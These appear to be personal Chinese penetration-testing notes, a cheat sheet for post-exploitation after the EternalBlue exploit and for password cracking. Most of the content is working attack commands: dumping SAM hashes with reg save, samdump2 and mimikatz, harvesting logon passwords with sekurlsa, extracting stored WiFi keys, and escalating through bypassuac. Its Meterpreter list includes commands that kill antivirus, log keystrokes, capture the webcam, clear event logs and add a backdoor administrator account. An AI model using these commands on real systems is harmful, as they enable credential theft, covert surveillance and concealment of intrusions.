john test.txt --format=crypt

 john爆破出现Using default input encoding: UTF-8 No password hashes loaded (see FAQ)
 我以为是
 >在Vim中直接进行转换文件编码,比如将一个文件转换成utf-8格式  
`:set fileencoding=utf-8`
查看文件格式  
`:set fileformat?`
设置文件格式为 unix  
`:set fileformat=unix`

结果不是
 出现这个提示不是说明破解失败了，而是这个hash以前被你破解过，可以使用以下命令查看破解出的密码是什么。
使用下面这条命令即可解决
john --show password.txt

msf永恒之蓝命令执行后：
hashdump得到的值拿到最后32位字母数字组合可以在下图,注意类型是NTLM
![[Pasted image 20240318142344.png]]

![[Pasted image 20240318114658.png]]

unshadow命令基本上会结合/etc/passwd的数据和/etc/shadow的数据，创建1个含有用户名和密码详细信息的文件
unshadow /etc/passwd /etc/shadow > shadow

Windows的登录密码的hash值保存在SAM文件中，SAM是“security account manager”的首字母缩写。通常，它位于

```
  C:\windows\system32\config\SAM
```
SAM文件被Windows保护，不能直接读取，需借助工具，如[SAMInside](http://www.insidepro.com/download/saminside.zip)。找一台Windows7虚拟机，新建一个名为hashcat的管理员用户，并设置密码，在Windows7中下载并解压SAMInside后以管理员权限运行，然后点击File->Import Local Users vis Scheduler，如下图所示：
```css
//导出 SAM 和 System 文件：通过 reg 的注册表导出
reg save hklm\sam sam.hive 
reg save hklm\system system.hive
move 移动文件
//使用mimikatz读取SAM和System文件
lsadump::sam /sam:sam.hive /system:system.hive
```
```css
samdump2 system.hive sam.hive > hash.txt
```
```bash
john -format=NT hash.txt  #破解,使用john自带的密码字典
john --show -format=NT hash.txt    #查看破解结果
```

![[Pasted image 20240318155653.png]]

```
ssh2john ~/.ssh/id_rsa > id_rsa.hash
```

```
keepass2john newdb.kdb > newdb.kdb.hash
```

```
rar2john encrypted.rar > encrypted.rar.hash
```

>[!ips]
后渗透阶段:
在meterpreter > 中我们可以使用以下的命令来实现对目标的操作：
sysinfo             #查看目标主机系统信息
run scraper         #查看目标主机详细信息
hashdump        #导出密码的哈希
load kiwi           #加载
ps                  #查看目标主机进程信息
pwd                 #查看目标当前目录(windows)
getlwd              #查看目标当前目录(Linux)
search -f *.jsp -d e:\                #搜索E盘中所有以.jsp为后缀的文件
download  e:\test.txt  /root          #将目标机的e:\test.txt文件下载到/root目录下
upload    /root/test.txt d:\test      #将/root/test.txt上传到目标机的 d:\test\ 目录下getpid              #查看当前Meterpreter Shell的进程
PIDmigrate 1384     #将当前Meterpreter Shell的进程迁移到PID为1384的进程上
idletime            #查看主机运行时间
getuid              #查看获取的当前权限
getsystem           #提权
run  killav         #关闭杀毒软件
screenshot          #截图
webcam_list         #查看目标主机的摄像头
webcam_snap         #拍照
webcam_stream       #开视频
execute  参数  -f 可执行文件   #执行可执行程序
run getgui -u hack -p 123    #创建hack用户，密码为123
run getgui -e                #开启远程桌面
run post/windows/manage/enable_rdp
keyscan_start                #开启键盘记录功能
keyscan_dump                 #显示捕捉到的键盘记录信息
keyscan_stop                 #停止键盘记录功能
uictl  disable  keyboard     #禁止目标使用键盘
uictl  enable   keyboard     #允许目标使用键盘
uictl  disable  mouse        #禁止目标使用鼠标
uictl  enable   mouse        #允许目标使用鼠标
load                         #使用扩展库
run				             #使用扩展库
clearev                       #清除日志

mimikatz
```python
##右键以管理员权限运行
##获取调试权限
privilege::debug
#在具有Isass进程的权限才可以抓到密码
##抓取密码
sekurlsa::logonpasswords

```

wifi密码抓取
```css
netsh wlan show profile 
netsh wlan show profile name="ssid" KEY=clear
```

windows 控制台cmd乱码的解决办法 chcp 65001

开启远程桌面的办法
```cs
getuid
#如果当前是user权限要管理员权限才能开启3389
#要用到bypassuac提权
use exploit/windows/local/bypassuac
set session 1
run

run post/windows/manage/enable_rdp

#进入shell
net user hacker 123qwe.. /add
#将用户提升到管理员权限
net localgroup administrators hacker /add

rdesktop -u hacker -p 123qwe..  192.168.1.145
```

```Css
使用kiwi来获取靶机密码，注意这里需要进行的一个操作为进程迁移，因为我们这里上线到msf的载荷是32位的(即x86)，这里需要找一个64位的(即x64)进行进程迁移才能使用kiwi获取靶机密码

sessions -i 2
load kiwi
kiwi_cmd privilege::debug
ps
migrate 1144
kiwi_cmd sekurlsa::logonPasswords

```

参考链接
[使用hashcat爆破各种hash | 若水斋](https://blog.werner.wiki/use-hashcat-crack-all-kinds-of-hash/)

[Windows 用户密码的加密方法与破解 | 国光](https://www.sqlsec.com/2019/11/winhash.html)

[永恒之蓝漏洞复现(ms17-010) - hkgan - 博客园](https://www.cnblogs.com/hkgan/p/17339860.html)

[SMBGhost\_RCE漏洞利用（MSF和CS联动） - FreeBuf网络安全行业门户](https://www.freebuf.com/vuls/277707.html)